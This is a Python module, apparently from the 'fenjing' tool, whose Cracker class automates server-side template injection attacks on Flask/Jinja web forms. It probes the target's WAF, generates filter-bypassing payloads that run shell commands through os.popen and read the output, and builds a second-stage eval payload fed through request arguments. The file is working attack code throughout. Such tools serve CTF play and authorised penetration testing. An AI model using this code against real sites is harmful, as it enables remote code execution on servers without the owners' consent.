"""攻击指定的路径

"""

from hashlib import new
import logging
import random
from collections import namedtuple
from string import ascii_lowercase
from typing import Union, Callable, Dict

from fenjing.form import random_fill

from .submitter import FormSubmitter, RequestSubmitter, Submitter
from .colorize import colored
from .const import (
    ATTRIBUTE,
    CHAINED_ATTRIBUTE_ITEM,
    EVAL,
    LITERAL,
    OS_POPEN_READ,
    DETECT_MODE_ACCURATE,
)
from .waf_func_gen import WafFuncGen
from .full_payload_gen import FullPayloadGen
from fenjing import submitter

logger = logging.getLogger("cracker")
Result = namedtuple("Result", "full_payload_gen input_field")


class Cracker:
    test_cmd = "echo f3n  j1ng;"
    test_eval = "'f'+str(3)+'n j'+str(1)+\"ng\""
    test_result = "f3n j1ng"

    def __init__(
        self,
        submitter: Submitter,
        callback: Union[Callable[[str, Dict], None], None] = None,
        detect_mode: str = DETECT_MODE_ACCURATE,
    ):
        self.detect_mode = detect_mode
        self.subm = submitter

        self._callback: Callable[[str, Dict], None] = (
            callback if callback else (lambda x, y: None)
        )
        self.waf_func_gen = WafFuncGen(
            submitter, callback=callback, detect_mode=detect_mode
        )

    @property
    def callback(self):
        """Callback函数

        Returns:
            Callable: Callback函数
        """
        return self._callback

    @callback.setter
    def callback(self, callback):
        self._callback = callback
        self.waf_func_gen.callback = callback

    def test_payload(self, payload: str):
        logger.info(
            "Testing generated payload.",
        )
        result = self.subm.submit(payload)
        assert result is not None
        _, text = result
        return self.test_result in text

    def test_payload_eval_args(self, payload: str, subm: Submitter):
        logger.info(
            "Testing generated payload as eval args.",
        )
        result = subm.submit(payload)
        assert result is not None
        _, text = result
        return self.test_result in text

    def has_respond(self):
        content = "".join(random.choices(ascii_lowercase, k=6))
        resp = self.subm.submit(content)
        assert resp is not None
        return content in resp.text

    def crack(self):
        logger.info("Cracking...")
        waf_func = self.waf_func_gen.generate()
        full_payload_gen = FullPayloadGen(
            waf_func, callback=None, detect_mode=self.detect_mode
        )
        payload, will_print = full_payload_gen.generate(OS_POPEN_READ, self.test_cmd)
        if payload is None:
            return None
        # payload测试成功时为True, 失败时为False, 无法测试为None
        if will_print:
            if self.test_payload(payload):
                logger.info(
                    "%s Now we can generate payloads.",
                    colored("green", "Success!", bold=True),
                )
            else:
                logger.info(
                    "%s! Generated payloads might be useless.",
                    colored("yellow", "Test Payload Failed", bold=True),
                )
        else:
            logger.info(
                "We WON'T SEE the execution result! "
                + "You can try generating payloads anyway.",
            )
        return full_payload_gen

    def crack_eval_args(self):
        logger.info("Cracking with request GET args...")
        assert isinstance(
            self.subm, FormSubmitter
        ), "Currently onlu FormSubmitter is supported"
        waf_func = self.waf_func_gen.generate()
        full_payload_gen = FullPayloadGen(
            waf_func, callback=None, detect_mode=self.detect_mode
        )
        args_target_field = "x"
        payload, will_print = full_payload_gen.generate(
            EVAL,
            (
                CHAINED_ATTRIBUTE_ITEM,
                (LITERAL, "request"),
                (ATTRIBUTE, "values"),
                (ATTRIBUTE, args_target_field),
            ),
        )
        if payload is None:
            return None
        assert will_print is not None, "It just shouldn't! when payload is not None!"
        payload_dict = {self.subm.target_field: payload}
        method = self.subm.form["method"]
        assert isinstance(method, str)
        new_subm = RequestSubmitter(
            url=self.subm.url,
            method=method,
            target_field=args_target_field,
            params=random_fill(self.subm.form) | payload_dict if method == "GET" else {},
            data=random_fill(self.subm.form) | payload_dict if method != "GET" else {},
            requester=self.subm.req,
        )
        if self.subm.tamperers:
            for tamperer in self.subm.tamperers:
                new_subm.add_tamperer(tamperer)
        if will_print:
            if self.test_payload_eval_args(self.test_eval, new_subm):
                logger.info(
                    "%s Now we can generate payloads.",
                    colored("green", "Success!", bold=True),
                )
            else:
                logger.info(
                    "%s! Generated payloads might be useless.",
                    colored("yellow", "Test Payload Failed", bold=True),
                )
        else:
            logger.info(
                "We WON'T SEE the execution result! "
                + "You can try generating payloads anyway.",
            )

        return full_payload_gen, new_subm, will_print
